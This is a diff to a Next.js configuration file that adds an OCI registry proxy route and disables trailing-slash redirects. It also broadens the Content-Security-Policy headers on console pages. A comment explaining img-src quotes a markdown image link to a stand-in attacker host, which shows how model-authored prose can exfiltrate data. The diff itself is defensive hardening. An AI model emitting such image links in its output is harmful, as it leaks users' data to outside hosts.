@@ -33,6 +33,19 @@ const hstsValue = process.env.HSTS ?? HSTS_DEFAULT
 const nextConfig = {
   output: 'standalone',
   allowedDevOrigins: ['terrapod.local'],
+  // Do not redirect `/path/` to `/path` (#1408).
+  //
+  // Next normalises trailing slashes *before* rewrites, and the OCI
+  // distribution spec's version check is literally `GET /v2/` — so the one
+  // endpoint a registry client uses to decide whether this host speaks the API
+  // was answered with a 308 to `/v2`, which is not a path the spec defines. A
+  // redirect there is not a cosmetic difference: it is the handshake, and some
+  // clients drop credentials across one.
+  //
+  // The cost is that page URLs are no longer normalised, which is why this is
+  // the setting rather than `trailingSlash`: the app's own links carry no
+  // trailing slash, so nothing in the UI depends on the redirect existing.
+  skipTrailingSlashRedirect: true,
   // Route the BFF's non-/api prefixes onto the shared proxy Route Handler
   // (#1381). These are INTERNAL rewrites — they do not name the API, they name
   // a route in this process — so unlike a rewrite pointing at API_URL they are
@@ -55,6 +68,13 @@ const nextConfig = {
         { source: '/.well-known/:path*', destination: '/bff/.well-known/:path*' },
         { source: '/oauth/:path*', destination: '/bff/oauth/:path*' },
         { source: '/v1/:path*', destination: '/bff/v1/:path*' },
+        // The OCI registry (#1408). `/v2/` is not a path Terrapod chose — the
+        // distribution spec mandates that prefix — so it has to be proxied like
+        // any other API surface, or `docker pull` against the deployment's own
+        // hostname reaches the web pod and gets an HTML 404. It streams through
+        // the Route Handler, which matters more here than anywhere else: image
+        // layers are the largest bodies Terrapod moves.
+        { source: '/v2/:path*', destination: '/bff/v2/:path*' },
       ],
     }
   },
@@ -66,46 +86,78 @@ const nextConfig = {
   // SSE endpoints are all Terrapod-native at /api/terrapod/v1. The
   // transitional /api/v2 aliases (#269) were removed in v0.24.0 (#278).
   async headers() {
-    const headers = [
-      {
-        source: '/api/terrapod/v1/listeners/:path*',
-        headers: [{ key: 'Content-Encoding', value: 'none' }],
-      },
-      {
-        source: '/api/terrapod/v1/workspaces/:path*/runs/events',
-        headers: [{ key: 'Content-Encoding', value: 'none' }],
-      },
-      {
-        source: '/api/terrapod/v1/workspace-events',
-        headers: [{ key: 'Content-Encoding', value: 'none' }],
-      },
-      {
-        source: '/api/terrapod/v1/agent-pools/:path*/events',
-        headers: [{ key: 'Content-Encoding', value: 'none' }],
-      },
-    ]
+      // Derived rather than listed per prefix, so a new SSE endpoint cannot be
+      // added to one and forgotten on the other. An SSE path missing this header
+      // does not error — it simply never delivers events, which is invisible
+      // until someone notices the UI has stopped updating.
+      const SSE_PATHS = [
+        '/listeners/:path*',
+        '/workspaces/:path*/runs/events',
+        '/workspace-events',
+        '/agent-pools/:path*/events',
+      ]
+      const API_PREFIXES = ['/api/v1', '/api/terrapod/v1']
+      const headers = API_PREFIXES.flatMap((prefix) =>
+        SSE_PATHS.map((path) => ({
+          source: `${prefix}${path}`,
+          headers: [{ key: 'Content-Encoding', value: 'none' }],
+        })),
+      )
     // Security headers on the PAGE routes (GHSA-46gw-rvrr-jqfx).
     //
     // The API already sets these on every response; Next.js page routes got
     // only HSTS. So the console's own pages could be framed while the API they
     // call could not — and the pages are where a human clicks queue-apply,
-    // delete-workspace and force-unlock.
+    // delete-workspace and force-unlock, which is what makes clickjacking worth
+    // closing here.
     //
     // APPENDED to the array above, never replacing it. That array carries the
     // Content-Encoding: none entries which are the only thing keeping SSE log
-    // streaming unbuffered, and redefining headers() would take them out
-    // silently — the failure mode being a log that just stops updating.
+    // streaming unbuffered, and redefining headers() would silently take them
+    // out — the failure mode being a log that simply stops updating.
     //
-    // frame-ancestors is the CSP half that matters here and costs no
-    // compatibility. A full CSP is deliberately not attempted: Next.js needs
-    // 'unsafe-inline' for styles unless nonces are wired through.
+    // frame-ancestors is the CSP half that matters here and has no
+    // compatibility cost. A full CSP is deliberately not attempted: Next.js
+    // needs 'unsafe-inline' for styles unless nonces are wired through, so a
+    // rushed policy would either break the console or be worth nothing.
+    //
+    // The directives beside it are the subset with the same property — each one
+    // forbids something the console does not do, so none of them can break it:
+    //
+    //   img-src 'self' data: blob:  The only <img> in the app is the local
+    //     logo. This is the directive that gives the model-authored markdown
+    //     fix (react-markdown `img: () => null`) a second floor: if any future
+    //     surface renders model prose without that components map, a
+    //     `![](https://attacker.example/p.png?d=…)` still fetches nothing.
+    //     data: and blob: stay for in-page downloads and canvas work.
+    //   object-src 'none'           No <object>/<embed> anywhere.
+    //   base-uri 'self'             No <base>; an injected one would silently
+    //     repoint every relative URL on the page.
+    //   frame-src 'self'            NOT 'none': /api-docs frames the API's own
+    //     ReDoc and Swagger UI at /api/redoc and /api/docs. Those are
+    //     same-origin through the BFF, so 'self' keeps that page working while
+    //     still refusing a remote frame.
+    //   form-action 'self'          Every <form> posts to this origin,
+    //     including the dynamically built one the CLI login flow submits.
+    //
+    // NOT added: script-src and style-src. The App Router emits inline
+    // bootstrap scripts, so either would need 'unsafe-inline' without nonce
+    // plumbing — which is the "worth nothing" case above, not a tightening.
+    const csp = [
+      "frame-ancestors 'none'",
+      "img-src 'self' data: blob:",
+      "object-src 'none'",
+      "base-uri 'self'",
+      "frame-src 'self'",
+      "form-action 'self'",
+    ].join('; ')
     headers.push({
       source: '/:path*',
       headers: [
         { key: 'X-Frame-Options', value: 'DENY' },
         { key: 'X-Content-Type-Options', value: 'nosniff' },
         { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
-        { key: 'Content-Security-Policy', value: "frame-ancestors 'none'" },
+        { key: 'Content-Security-Policy', value: csp },
       ],
     })
     if (hstsValue) {
